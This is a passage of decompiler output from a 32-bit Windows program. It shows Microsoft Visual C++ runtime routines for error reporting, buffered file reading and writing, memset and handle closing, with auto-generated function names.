  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040df7b(8);
  }
  return;
}



void FUN_0040ee1c(undefined4 param_1)

{
  FUN_0040ecf0();
  return;
}



void FUN_0040ee32(undefined4 param_1)

{
  FUN_0040ecf0();
  return;
}



void FUN_0040ee48(void)

{
  FUN_0040ecf0();
  return;
}



void FUN_0040ee66(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_0040cb65();
  FUN_0040f098(uVar1);
  FUN_0041466c(uVar1);
  FUN_0040c90b(uVar1);
  FUN_004150fe(uVar1);
  FUN_004150ef(uVar1);
  FUN_00414edd(uVar1);
  FUN_0041783a();
  FUN_00414ecc();
  DAT_004225ac = FUN_0040caf3(0x40ee32);
  return;
}



void __cdecl FUN_0040eeb4(int param_1)

{
  uint **ppuVar1;
  uint uVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  HANDLE hFile;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  do {
    if (param_1 == (&DAT_004225b0)[local_8 * 2]) break;
    local_8 = local_8 + 1;
  } while (local_8 < 0x17);
  uVar2 = local_8;
  if (local_8 < 0x17) {
    iVar3 = FUN_004153bb(3);
    if ((iVar3 == 1) || ((iVar3 = FUN_004153bb(3), iVar3 == 0 && (DAT_00422040 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = &local_c;
        ppuVar1 = (uint **)(uVar2 * 8 + 0x4225b4);
        pcVar5 = FUN_00415330(*ppuVar1);
        WriteFile(hFile,*ppuVar1,(DWORD)pcVar5,lpNumberOfBytesWritten,lpOverlapped);
      }
    }
    else if (param_1 != 0xfc) {
      iVar3 = FUN_0040bcd6(&DAT_00423eb0,0x314,s_Runtime_Error__Program__0041c900);
      if (iVar3 != 0) {
        FUN_0040c91a();
      }
      DAT_00423fcd = 0;
      DVar4 = GetModuleFileNameA((HMODULE)0x0,&DAT_00423ec9,0x104);
      if ((DVar4 == 0) &&
         (iVar3 = FUN_0040bcd6(&DAT_00423ec9,0x2fb,s_<program_name_unknown>_0041c8e8), iVar3 != 0))
      {
        FUN_0040c91a();
      }
      pcVar5 = FUN_00415330((uint *)&DAT_00423ec9);
      if ((char *)0x3c < pcVar5 + 1) {
        pcVar5 = FUN_00415330((uint *)&DAT_00423ec9);
        iVar3 = FUN_00415276(pcVar5 + 0x423e8e,(int)&DAT_004241c4 - (int)(pcVar5 + 0x423e8e),
                             &DAT_0041c8e4,3);
        if (iVar3 != 0) {
          FUN_0040c91a();
        }
      }
      iVar3 = FUN_0040bf5b(&DAT_00423eb0,0x314,&DAT_0041c8e0);
      if (iVar3 != 0) {
        FUN_0040c91a();
      }
      iVar3 = FUN_0040bf5b(&DAT_00423eb0,0x314,*(char **)(local_8 * 8 + 0x4225b4));
      if (iVar3 != 0) {
        FUN_0040c91a();
      }
      FUN_0041510d(&DAT_00423eb0,s_Microsoft_Visual_C___Runtime_Lib_0041c8b8,0x12010);
    }
  }
  return;
}



void FUN_0040f05f(void)

{
  int iVar1;
  
  iVar1 = FUN_004153bb(3);
  if (iVar1 != 1) {
    iVar1 = FUN_004153bb(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_00422040 != 1) {
      return;
    }
  }
  FUN_0040eeb4(0xfc);
  FUN_0040eeb4(0xff);
  return;
}



void __cdecl FUN_0040f098(undefined4 param_1)

{
  DAT_004241c4 = param_1;
  return;
}



undefined4 __cdecl FUN_0040f0a7(undefined4 param_1)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)FUN_0040cb6e(DAT_004241c4);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(param_1);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



uint __cdecl FUN_0040f0cf(byte **param_1)

{
  byte bVar1;
  undefined4 *puVar2;
  byte *pbVar3;
  int iVar4;
  uint uVar5;
  undefined *puVar6;
  
  if (param_1 == (byte **)0x0) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 0x16;
    FUN_0040ca42();
  }
  else {
    pbVar3 = param_1[3];
    if ((((uint)pbVar3 & 0x83) != 0) && (((uint)pbVar3 & 0x40) == 0)) {
      if (((uint)pbVar3 & 2) == 0) {
        param_1[3] = (byte *)((uint)pbVar3 | 1);
        if (((uint)pbVar3 & 0x10c) == 0) {
          FUN_00415406(param_1);
        }
        else {
          *param_1 = param_1[2];
        }
        FUN_0040dac0((int)param_1);
        pbVar3 = (byte *)FUN_0040f7bc();
        param_1[1] = pbVar3;
        if ((pbVar3 != (byte *)0x0) && (pbVar3 != (byte *)0xffffffff)) {
          if ((*(byte *)(param_1 + 3) & 0x82) == 0) {
            iVar4 = FUN_0040dac0((int)param_1);
            if ((iVar4 == -1) || (iVar4 = FUN_0040dac0((int)param_1), iVar4 == -2)) {
              puVar6 = &DAT_00422448;
            }
            else {
              iVar4 = FUN_0040dac0((int)param_1);
              uVar5 = FUN_0040dac0((int)param_1);
              puVar6 = (undefined *)((uVar5 & 0x1f) * 0x40 + (&DAT_004257c0)[iVar4 >> 5]);
            }
            if ((puVar6[4] & 0x82) == 0x82) {
              param_1[3] = (byte *)((uint)param_1[3] | 0x2000);
            }
          }
          if (((param_1[6] == (byte *)0x200) && (((uint)param_1[3] & 8) != 0)) &&
             (((uint)param_1[3] & 0x400) == 0)) {
            param_1[6] = (byte *)0x1000;
          }
          param_1[1] = param_1[1] + -1;
          bVar1 = **param_1;
          *param_1 = *param_1 + 1;
          return (uint)bVar1;
        }
        param_1[3] = (byte *)((uint)param_1[3] | (-(uint)(pbVar3 != (byte *)0x0) & 0x10) + 0x10);
        param_1[1] = (byte *)0x0;
      }
      else {
        param_1[3] = (byte *)((uint)pbVar3 | 0x20);
      }
    }
  }
  return 0xffffffff;
}



int __cdecl FUN_0040f1fa(uint param_1,LPWSTR param_2,LPWSTR param_3)

{
  int *piVar1;
  byte *pbVar2;
  byte bVar3;
  char cVar4;
  undefined4 *puVar5;
  LPWSTR pWVar6;
  BOOL BVar7;
  DWORD DVar8;
  LPWSTR pWVar9;
  int iVar10;
  LPWSTR pWVar11;
  int iVar12;
  bool bVar13;
  undefined8 uVar14;
  WCHAR WVar15;
  LPWSTR local_1c;
  int local_18;
  LPWSTR local_14;
  LPWSTR local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  pWVar11 = param_3;
  local_18 = -2;
  if (param_1 == 0xfffffffe) {
    puVar5 = (undefined4 *)FUN_0040cabd();
    *puVar5 = 0;
    puVar5 = (undefined4 *)FUN_0040caaa();
    *puVar5 = 9;
    return -1;
  }
  if (((int)param_1 < 0) || (DAT_004257ac <= param_1)) {
    puVar5 = (undefined4 *)FUN_0040cabd();
    *puVar5 = 0;
    puVar5 = (undefined4 *)FUN_0040caaa();
    *puVar5 = 9;
    FUN_0040ca42();
    return -1;
  }
  piVar1 = &DAT_004257c0 + ((int)param_1 >> 5);
  iVar12 = (param_1 & 0x1f) * 0x40;
  bVar3 = *(byte *)(*piVar1 + iVar12 + 4);
  if ((bVar3 & 1) == 0) {
    puVar5 = (undefined4 *)FUN_0040cabd();
    *puVar5 = 0;
    puVar5 = (undefined4 *)FUN_0040caaa();
    *puVar5 = 9;
    goto LAB_0040f304;
  }
  if (param_3 < (LPWSTR)0x80000000) {
    local_14 = (LPWSTR)0x0;
    if ((param_3 == (LPWSTR)0x0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (param_2 != (LPWSTR)0x0) {
      local_6 = (char)(*(char *)(*piVar1 + iVar12 + 0x24) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~(uint)param_3 & 1) == 0) goto LAB_0040f2f2;
        pWVar9 = (LPWSTR)((uint)param_3 >> 1);
        param_3 = (LPWSTR)0x4;
        if ((LPWSTR)0x3 < pWVar9) {
          param_3 = pWVar9;
        }
        local_10 = (LPWSTR)FUN_00413b52((uint)param_3);
        if (local_10 == (LPWSTR)0x0) {
          puVar5 = (undefined4 *)FUN_0040caaa();
          *puVar5 = 0xc;
          puVar5 = (undefined4 *)FUN_0040cabd();
          *puVar5 = 8;
          return -1;
        }
        uVar14 = FUN_0041544f(param_1,0,0,1);
        iVar10 = *piVar1;
        *(int *)(iVar12 + 0x28 + iVar10) = (int)uVar14;
        *(int *)(iVar12 + 0x2c + iVar10) = (int)((ulonglong)uVar14 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~(uint)param_3 & 1) == 0) goto LAB_0040f2f2;
          param_3 = (LPWSTR)((uint)param_3 & 0xfffffffe);
        }
        local_10 = param_2;
      }
      pWVar6 = local_10;
      pWVar9 = param_3;
      if ((((*(byte *)(*piVar1 + iVar12 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar1 + iVar12 + 5), cVar4 != '\n')) && (param_3 != (LPWSTR)0x0)) {
        *(char *)local_10 = cVar4;
        pWVar6 = (LPWSTR)((int)local_10 + 1);
        pWVar9 = (LPWSTR)((int)param_3 + -1);
        local_14 = (LPWSTR)0x1;
        *(undefined *)(iVar12 + 5 + *piVar1) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar12 + 0x25 + *piVar1), cVar4 != '\n')) &&
           (pWVar9 != (LPWSTR)0x0)) {
          *(char *)pWVar6 = cVar4;
          pWVar6 = local_10 + 1;
          pWVar9 = param_3 + -1;
          local_14 = (LPWSTR)0x2;
          *(undefined *)(iVar12 + 0x25 + *piVar1) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar12 + 0x26 + *piVar1), cVar4 != '\n'))
             && (pWVar9 != (LPWSTR)0x0)) {
            *(char *)pWVar6 = cVar4;
            pWVar6 = (LPWSTR)((int)local_10 + 3);
            local_14 = (LPWSTR)0x3;
            *(undefined *)(iVar12 + 0x26 + *piVar1) = 10;
            pWVar9 = (LPWSTR)((int)param_3 + -3);
          }
        }
      }
      param_3 = pWVar9;
      BVar7 = ReadFile(*(HANDLE *)(iVar12 + *piVar1),pWVar6,(DWORD)param_3,(LPDWORD)&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar7 == 0) || ((int)local_1c < 0)) || (param_3 < local_1c)) {
        DVar8 = GetLastError();
        if (DVar8 != 5) {
          if (DVar8 == 0x6d) {
            local_18 = 0;
            goto LAB_0040f611;
          }
          goto LAB_0040f606;
        }
        puVar5 = (undefined4 *)FUN_0040caaa();
        *puVar5 = 9;
        puVar5 = (undefined4 *)FUN_0040cabd();
        *puVar5 = 5;
      }
      else {
        local_14 = (LPWSTR)((int)local_14 + (int)local_1c);
        pbVar2 = (byte *)(iVar12 + 4 + *piVar1);
        if ((*pbVar2 & 0x80) == 0) goto LAB_0040f611;
        if (local_6 == '\x02') {
          if ((local_1c == (LPWSTR)0x0) || (*local_10 != L'\n')) {
            *pbVar2 = *pbVar2 & 0xfb;
          }
          else {
            *pbVar2 = *pbVar2 | 4;
          }
          local_14 = (LPWSTR)((int)local_14 + (int)local_10);
          param_3 = local_10;
          pWVar11 = local_10;
          if (local_10 < local_14) {
            do {
              WVar15 = *param_3;
              if (WVar15 == L'\x1a') {
                pbVar2 = (byte *)(iVar12 + 4 + *piVar1);
                if ((*pbVar2 & 0x40) == 0) {
                  *pbVar2 = *pbVar2 | 2;
                }
                else {
                  *pWVar11 = *param_3;
                  pWVar11 = pWVar11 + 1;
                }
                break;
              }
              if (WVar15 == L'\r') {
                if (param_3 < local_14 + -1) {
                  if (param_3[1] == L'\n') {
                    pWVar9 = param_3 + 2;
                    goto LAB_0040f6b4;
                  }
LAB_0040f747:
                  param_3 = param_3 + 1;
                  WVar15 = L'\r';
LAB_0040f749:
                  *pWVar11 = WVar15;
                }
                else {
                  pWVar9 = param_3 + 1;
                  BVar7 = ReadFile(*(HANDLE *)(iVar12 + *piVar1),&local_c,2,(LPDWORD)&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar7 == 0) && (DVar8 = GetLastError(), DVar8 != 0)) ||
                     (local_1c == (LPWSTR)0x0)) goto LAB_0040f747;
                  if ((*(byte *)(iVar12 + 4 + *piVar1) & 0x48) == 0) {
                    if ((pWVar11 == local_10) && (local_c == 10)) goto LAB_0040f6b4;
                    FUN_0041544f(param_1,-2,-1,1);
                    if (local_c == 10) goto LAB_0040f74f;
                    goto LAB_0040f747;
                  }
                  if (local_c == 10) {
LAB_0040f6b4:
                    param_3 = pWVar9;
                    WVar15 = L'\n';
                    goto LAB_0040f749;
                  }
                  *pWVar11 = L'\r';
                  *(undefined *)(iVar12 + 5 + *piVar1) = (undefined)local_c;
                  *(undefined *)(iVar12 + 0x25 + *piVar1) = local_c._1_1_;
                  *(undefined *)(iVar12 + 0x26 + *piVar1) = 10;
                  param_3 = pWVar9;
                }
                pWVar11 = pWVar11 + 1;
                pWVar9 = param_3;
              }
              else {
                *pWVar11 = WVar15;
                pWVar11 = pWVar11 + 1;
                pWVar9 = param_3 + 1;
              }
LAB_0040f74f:
              param_3 = pWVar9;
            } while (param_3 < local_14);
          }
          local_14 = (LPWSTR)((int)pWVar11 - (int)local_10);
          goto LAB_0040f611;
        }
        if ((local_1c == (LPWSTR)0x0) || (*(char *)local_10 != '\n')) {
          *pbVar2 = *pbVar2 & 0xfb;
        }
        else {
          *pbVar2 = *pbVar2 | 4;
        }
        local_14 = (LPWSTR)((int)local_14 + (int)local_10);
        param_3 = local_10;
        pWVar9 = local_10;
        if (local_10 < local_14) {
          do {
            cVar4 = *(char *)param_3;
            if (cVar4 == '\x1a') {
              pbVar2 = (byte *)(iVar12 + 4 + *piVar1);
              if ((*pbVar2 & 0x40) == 0) {
                *pbVar2 = *pbVar2 | 2;
              }
              else {
                *(undefined *)pWVar9 = *(undefined *)param_3;
                pWVar9 = (LPWSTR)((int)pWVar9 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (param_3 < (LPWSTR)((int)local_14 + -1)) {
                if (*(char *)((int)param_3 + 1) == '\n') {
                  pWVar6 = param_3 + 1;
                  goto LAB_0040f491;
                }
LAB_0040f508:
                param_3 = (LPWSTR)((int)param_3 + 1);
                *(undefined *)pWVar9 = 0xd;
              }
              else {
                pWVar6 = (LPWSTR)((int)param_3 + 1);
                BVar7 = ReadFile(*(HANDLE *)(iVar12 + *piVar1),&local_5,1,(LPDWORD)&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar7 == 0) && (DVar8 = GetLastError(), DVar8 != 0)) ||
                   (local_1c == (LPWSTR)0x0)) goto LAB_0040f508;
                if ((*(byte *)(iVar12 + 4 + *piVar1) & 0x48) == 0) {
                  if ((pWVar9 == local_10) && (local_5 == '\n')) goto LAB_0040f491;
                  FUN_0041544f(param_1,-1,-1,1);
                  if (local_5 == '\n') goto LAB_0040f50c;
                  goto LAB_0040f508;
                }
                if (local_5 == '\n') {
LAB_0040f491:
                  param_3 = pWVar6;
                  *(undefined *)pWVar9 = 10;
                }
                else {
                  *(undefined *)pWVar9 = 0xd;
                  *(char *)(iVar12 + 5 + *piVar1) = local_5;
                  param_3 = pWVar6;
                }
              }
              pWVar9 = (LPWSTR)((int)pWVar9 + 1);
              pWVar6 = param_3;
            }
            else {
              *(char *)pWVar9 = cVar4;
              pWVar9 = (LPWSTR)((int)pWVar9 + 1);
              pWVar6 = (LPWSTR)((int)param_3 + 1);
            }
LAB_0040f50c:
            param_3 = pWVar6;
          } while (param_3 < local_14);
        }
        local_14 = (LPWSTR)((int)pWVar9 - (int)local_10);
        if ((local_6 != '\x01') || (local_14 == (LPWSTR)0x0)) goto LAB_0040f611;
        bVar3 = *(byte *)(LPWSTR)((int)pWVar9 + -1);
        if ((char)bVar3 < '\0') {
          iVar10 = 1;
          pWVar9 = (LPWSTR)((int)pWVar9 + -1);
          while ((((&DAT_00422668)[bVar3] == '\0' && (iVar10 < 5)) && (local_10 <= pWVar9))) {
            pWVar9 = (LPWSTR)((int)pWVar9 + -1);
            bVar3 = *(byte *)pWVar9;
            iVar10 = iVar10 + 1;
          }
          if ((char)(&DAT_00422668)[*(byte *)pWVar9] == 0) {
            puVar5 = (undefined4 *)FUN_0040caaa();
            *puVar5 = 0x2a;
            goto LAB_0040f60d;
          }
          if ((char)(&DAT_00422668)[*(byte *)pWVar9] + 1 == iVar10) {
            pWVar9 = (LPWSTR)((int)pWVar9 + iVar10);
          }
          else if ((*(byte *)(*piVar1 + iVar12 + 4) & 0x48) == 0) {
            FUN_0041544f(param_1,-iVar10,-iVar10 >> 0x1f,1);
          }
          else {
            pWVar6 = (LPWSTR)((int)pWVar9 + 1);
            *(byte *)(*piVar1 + iVar12 + 5) = *(byte *)pWVar9;
            if (1 < iVar10) {
              *(undefined *)(iVar12 + 0x25 + *piVar1) = *(undefined *)pWVar6;
              pWVar6 = pWVar9 + 1;
            }
            if (iVar10 == 3) {
              *(undefined *)(iVar12 + 0x26 + *piVar1) = *(undefined *)pWVar6;
              pWVar6 = (LPWSTR)((int)pWVar6 + 1);
            }
            pWVar9 = (LPWSTR)((int)pWVar6 - iVar10);
          }
        }
        iVar10 = (int)pWVar9 - (int)local_10;
        local_14 = (LPWSTR)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,iVar10,param_2,
                                               (uint)pWVar11 >> 1);
        if (local_14 != (LPWSTR)0x0) {
          bVar13 = local_14 != (LPWSTR)iVar10;
          local_14 = (LPWSTR)((int)local_14 * 2);
          *(uint *)(iVar12 + 0x30 + *piVar1) = (uint)bVar13;
          goto LAB_0040f611;
        }
        DVar8 = GetLastError();
LAB_0040f606:
        FUN_0040cad0(DVar8);
      }
LAB_0040f60d:
      local_18 = -1;
LAB_0040f611:
      if (local_10 != param_2) {
        FUN_0040b61e();
      }
      if (local_18 == -2) {
        return (int)local_14;
      }
      return local_18;
    }
  }
LAB_0040f2f2:
  puVar5 = (undefined4 *)FUN_0040cabd();
  *puVar5 = 0;
  puVar5 = (undefined4 *)FUN_0040caaa();
  *puVar5 = 0x16;
LAB_0040f304:
  FUN_0040ca42();
  return -1;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040f7bc(void)

{
  uint uVar1;
  undefined4 *puVar2;
  int unaff_EBP;
  int iVar3;
  
  FUN_0040d634(&DAT_00420560,0x10);
  uVar1 = *(uint *)(unaff_EBP + 8);
  if (uVar1 == 0xfffffffe) {
    puVar2 = (undefined4 *)FUN_0040cabd();
    *puVar2 = 0;
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    return 0xffffffff;
  }
  if ((-1 < (int)uVar1) && (uVar1 < DAT_004257ac)) {
    iVar3 = (uVar1 & 0x1f) * 0x40;
    if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar3) & 1) != 0) {
      if (*(uint *)(unaff_EBP + 0x10) < 0x80000000) {
        FUN_00414ae5();
        *(undefined4 *)(unaff_EBP + -4) = 0;
        if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar3) & 1) == 0) {
          puVar2 = (undefined4 *)FUN_0040caaa();
          *puVar2 = 9;
          puVar2 = (undefined4 *)FUN_0040cabd();
          *puVar2 = 0;
          *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
        }
        else {
          iVar3 = FUN_0040f1fa(*(uint *)(unaff_EBP + 8),*(LPWSTR *)(unaff_EBP + 0xc),
                               *(LPWSTR *)(unaff_EBP + 0x10));
          *(int *)(unaff_EBP + -0x1c) = iVar3;
        }
        *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
        FUN_0040f8af();
        return *(undefined4 *)(unaff_EBP + -0x1c);
      }
      puVar2 = (undefined4 *)FUN_0040cabd();
      *puVar2 = 0;
      puVar2 = (undefined4 *)FUN_0040caaa();
      *puVar2 = 0x16;
      goto LAB_0040f80b;
    }
  }
  puVar2 = (undefined4 *)FUN_0040cabd();
  *puVar2 = 0;
  puVar2 = (undefined4 *)FUN_0040caaa();
  *puVar2 = 9;
LAB_0040f80b:
  FUN_0040ca42();
  return 0xffffffff;
}



void FUN_0040f8af(void)

{
  int unaff_EBP;
  
  FUN_00414b85(*(uint *)(unaff_EBP + 8));
  return;
}



undefined (*) [16] __cdecl FUN_0040f8c0(undefined (*param_1) [16],uint param_2,uint param_3)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  uint uVar4;
  
  if (param_3 == 0) {
    return param_1;
  }
  uVar1 = param_2 & 0xff;
  if ((((char)param_2 == '\0') && (0xff < param_3)) && (DAT_00425778 != 0)) {
    pauVar2 = FUN_00415644(param_1,param_2,param_3);
    return pauVar2;
  }
  pauVar2 = param_1;
  if (3 < param_3) {
    uVar3 = -(int)param_1 & 3;
    uVar4 = param_3;
    if (uVar3 != 0) {
      uVar4 = param_3 - uVar3;
      do {
        (*pauVar2)[0] = (char)param_2;
        pauVar2 = (undefined (*) [16])(*pauVar2 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    param_3 = uVar4 & 3;
    uVar4 = uVar4 >> 2;
    if (uVar4 != 0) {
      for (; uVar4 != 0; uVar4 = uVar4 - 1) {
        *(uint *)*pauVar2 = uVar1;
        pauVar2 = (undefined (*) [16])(*pauVar2 + 4);
      }
      if (param_3 == 0) {
        return param_1;
      }
    }
  }
  do {
    (*pauVar2)[0] = (char)uVar1;
    pauVar2 = (undefined (*) [16])(*pauVar2 + 1);
    param_3 = param_3 - 1;
  } while (param_3 != 0);
  return param_1;
}



undefined4 __cdecl FUN_0040f93a(uint param_1)

{
  int iVar1;
  int iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  undefined4 uVar5;
  
  iVar1 = FUN_00414a6e(param_1);
  if (iVar1 != -1) {
    if (((param_1 == 1) && ((*(byte *)(DAT_004257c0 + 0x84) & 1) != 0)) ||
       ((param_1 == 2 && ((*(byte *)(DAT_004257c0 + 0x44) & 1) != 0)))) {
      iVar1 = FUN_00414a6e(2);
      iVar2 = FUN_00414a6e(1);
      if (iVar2 == iVar1) goto LAB_0040f9a0;
    }
    hObject = (HANDLE)FUN_00414a6e(param_1);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0040f9a2;
    }
  }
LAB_0040f9a0:
  DVar4 = 0;
LAB_0040f9a2:
  FUN_004149e8(param_1);
  *(undefined *)((&DAT_004257c0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x40) = 0;
  if (DVar4 == 0) {
    uVar5 = 0;
  }
  else {
    FUN_0040cad0(DVar4);
    uVar5 = 0xffffffff;
  }
  return uVar5;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040f9d6(void)

{
  uint uVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  int unaff_EBP;
  int iVar4;
  
  FUN_0040d634(&DAT_00420580,0x10);
  uVar1 = *(uint *)(unaff_EBP + 8);
  if (uVar1 == 0xfffffffe) {
    puVar2 = (undefined4 *)FUN_0040cabd();
    *puVar2 = 0;
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
  }
  else {
    if ((-1 < (int)uVar1) && (uVar1 < DAT_004257ac)) {
      iVar4 = (uVar1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar4) & 1) != 0) {
        FUN_00414ae5();
        *(undefined4 *)(unaff_EBP + -4) = 0;
        if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar4) & 1) == 0) {
          puVar2 = (undefined4 *)FUN_0040caaa();
          *puVar2 = 9;
          *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
        }
        else {
          uVar3 = FUN_0040f93a(*(uint *)(unaff_EBP + 8));
          *(undefined4 *)(unaff_EBP + -0x1c) = uVar3;
        }
        *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
        FUN_0040fa99();
        return *(undefined4 *)(unaff_EBP + -0x1c);
      }
    }
    puVar2 = (undefined4 *)FUN_0040cabd();
    *puVar2 = 0;
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    FUN_0040ca42();
  }
  return 0xffffffff;
}



void FUN_0040fa99(void)

{
  int unaff_EBP;
  
  FUN_00414b85(*(uint *)(unaff_EBP + 8));
  return;
}



void __cdecl FUN_0040faa3(undefined4 *param_1)

{
  if (((param_1[3] & 0x83) != 0) && ((param_1[3] & 8) != 0)) {
    FUN_0040b61e();
    param_1[3] = param_1[3] & 0xfffffbf7;
    *param_1 = 0;
    param_1[2] = 0;
    param_1[1] = 0;
  }
  return;
}



uint __cdecl FUN_0040fad4(byte param_1,int *param_2)

{
  uint uVar1;
  byte bVar2;
  uint uVar3;
  undefined4 *puVar4;
  undefined *puVar5;
  undefined3 extraout_var;
  int iVar6;
  longlong lVar7;
  int local_8;
  
  uVar3 = FUN_0040dac0((int)param_2);
  uVar1 = param_2[3];
  if ((uVar1 & 0x82) == 0) {
    puVar4 = (undefined4 *)FUN_0040caaa();
    *puVar4 = 9;
LAB_0040fafa:
    param_2[3] = param_2[3] | 0x20;
    return 0xffffffff;
  }
  if ((uVar1 & 0x40) != 0) {
    puVar4 = (undefined4 *)FUN_0040caaa();
    *puVar4 = 0x22;
    goto LAB_0040fafa;
  }
  if ((uVar1 & 1) != 0) {
    param_2[1] = 0;
    if ((uVar1 & 0x10) == 0) {
      param_2[3] = uVar1 | 0x20;
      return 0xffffffff;
    }
    *param_2 = param_2[2];
    param_2[3] = uVar1 & 0xfffffffe;
  }
  uVar1 = param_2[3];
  param_2[3] = uVar1 & 0xffffffef | 2;
  param_2[1] = 0;
  local_8 = 0;
  if (((uVar1 & 0x10c) == 0) &&
     (((puVar5 = FUN_0040d090(), param_2 != (int *)(puVar5 + 0x20) &&
       (puVar5 = FUN_0040d090(), param_2 != (int *)(puVar5 + 0x40))) ||
      (bVar2 = FUN_004156d3(uVar3), CONCAT31(extraout_var,bVar2) == 0)))) {
    FUN_00415406(param_2);
  }
  if ((param_2[3] & 0x108U) == 0) {
    iVar6 = 1;
    local_8 = FUN_0041036b();
  }
  else {
    iVar6 = *param_2;
    *param_2 = param_2[2] + 1;
    iVar6 = iVar6 - param_2[2];
    param_2[1] = param_2[6] + -1;
    if (iVar6 < 1) {
      if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {
        puVar5 = &DAT_00422448;
      }
      else {
        puVar5 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_004257c0)[(int)uVar3 >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) && (lVar7 = FUN_004154d4(), lVar7 == -1)) goto LAB_0040fc22;
    }
    else {
      local_8 = FUN_0041036b();
    }
    *(byte *)param_2[2] = param_1;
  }
  if (local_8 == iVar6) {
    return (uint)param_1;
  }
LAB_0040fc22:
  param_2[3] = param_2[3] | 0x20;
  return 0xffffffff;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Type propagation algorithm not settling

void __fastcall
FUN_0040fc38(undefined4 param_1,undefined4 param_2,uint param_3,WCHAR *param_4,WCHAR *param_5)

{
  WCHAR *pWVar1;
  WCHAR WVar2;
  DWORD DVar3;
  byte bVar4;
  short sVar5;
  undefined4 *puVar6;
  undefined3 extraout_var;
  undefined (*pauVar7) [16];
  BOOL BVar8;
  int iVar9;
  DWORD DVar10;
  DWORD extraout_ECX;
  DWORD extraout_ECX_00;
  WCHAR *pWVar11;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  undefined4 extraout_EDX_10;
  undefined4 extraout_EDX_11;
  undefined4 extraout_EDX_12;
  undefined4 extraout_EDX_13;
  undefined4 extraout_EDX_14;
  undefined4 extraout_EDX_15;
  undefined4 extraout_EDX_16;
  undefined4 extraout_EDX_17;
  char cVar12;
  WCHAR *pWVar13;
  int *piVar14;
  char *pcVar15;
  int iVar16;
  undefined8 uVar17;
  uint uVar18;
  UINT local_1ae8;
  uint local_1ae4;
  char local_1add;
  int *local_1adc;
  WCHAR *local_1ad8;
  DWORD local_1ad4;
  WCHAR *local_1ad0;
  WCHAR *local_1acc;
  WCHAR *local_1ac8;
  DWORD local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_1ad0 = param_4;
  local_1acc = (WCHAR *)0x0;
  local_1ad4 = 0;
  if (param_5 == (WCHAR *)0x0) goto LAB_0041035e;
  if (param_4 == (WCHAR *)0x0) {
    puVar6 = (undefined4 *)FUN_0040cabd();
    *puVar6 = 0;
    puVar6 = (undefined4 *)FUN_0040caaa();
    *puVar6 = 0x16;
    FUN_0040ca42();
    param_2 = extraout_EDX;
    goto LAB_0041035e;
  }
  piVar14 = &DAT_004257c0 + ((int)param_3 >> 5);
  iVar16 = (param_3 & 0x1f) * 0x40;
  cVar12 = (char)(*(char *)(*piVar14 + iVar16 + 0x24) * '\x02') >> 1;
  local_1add = cVar12;
  local_1adc = piVar14;
